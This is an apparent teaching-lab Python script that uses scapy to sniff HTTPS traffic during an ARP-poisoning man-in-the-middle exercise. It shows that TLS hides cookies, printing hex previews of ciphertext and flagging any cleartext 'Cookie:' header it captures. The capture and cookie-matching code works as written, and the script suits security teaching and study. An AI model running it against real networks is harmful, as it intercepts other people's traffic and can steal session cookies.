#!/usr/bin/env python3
# sniff_cookie_https.py — LAB USE ONLY, isolated network, machines you own.
#
# Section 5 counterpart to sniff_cookie.py.
#
# Over plaintext HTTP (port 80) the old sniffer could read the "Cookie:" header
# straight off the wire. Over HTTPS (port 443) the SAME ARP poisoning still puts
# us in the middle and we still capture every packet — but the TCP payload is now
# TLS ciphertext, so there is no readable Cookie header to steal.
#
# This script makes that visible: it captures traffic on 443 while the ARP
# poisoner runs, shows that bytes really are flowing through the attacker, dumps
# a short hex preview of the encrypted payload, and confirms no "Cookie:" line
# ever appears.

from scapy.all import sniff, TCP, Raw, IP

PORT = 443 # <-- the one change from the HTTP sniffer (was 80)
captured = 0
with_payload = 0
cookies_found = 0

def preview(raw: bytes, n: int = 32) -> str:
    """First n bytes of the payload as hex — this is what ciphertext looks like."""
    return raw[:n].hex(" ")

def handle(pkt):
    global captured, with_payload, cookies_found
    captured += 1

    if pkt.haslayer(Raw) and pkt.haslayer(TCP):
        with_payload += 1
        raw = bytes(pkt[Raw].load)

        # Try to read it as text, exactly like the HTTP sniffer did.
        text = raw.decode(errors="ignore")
        found_here = [ln for ln in text.split("\r\n") if ln.startswith("Cookie:")]

        src, dst = pkt[IP].src, pkt[IP].dst
        if found_here:
            # This branch should NEVER fire once TLS is in place.
            cookies_found += len(found_here)
            for ln in found_here:
                print(f"[!!] CLEARTEXT COOKIE  {src} -> {dst}  {ln}")
        else:
            # The normal HTTPS case: encrypted bytes, nothing human-readable.
            print(f"[enc] {src} -> {dst}  {len(raw):4d} bytes ciphertext | {preview(raw)} ...")

    # periodic running tally
    if captured % 20 == 0:
        print(f"      --- captured={captured}  payload_pkts={with_payload}  "
              f"cleartext_cookies={cookies_found} ---")

print(f"Sniffing TLS on port {PORT}. ARP poisoning is active, so packets DO reach us —")
print("but the payloads below are ciphertext. Watch: no 'Cookie:' line ever prints.\n")
sniff(filter=f"tcp port {PORT}", prn=handle, store=False)
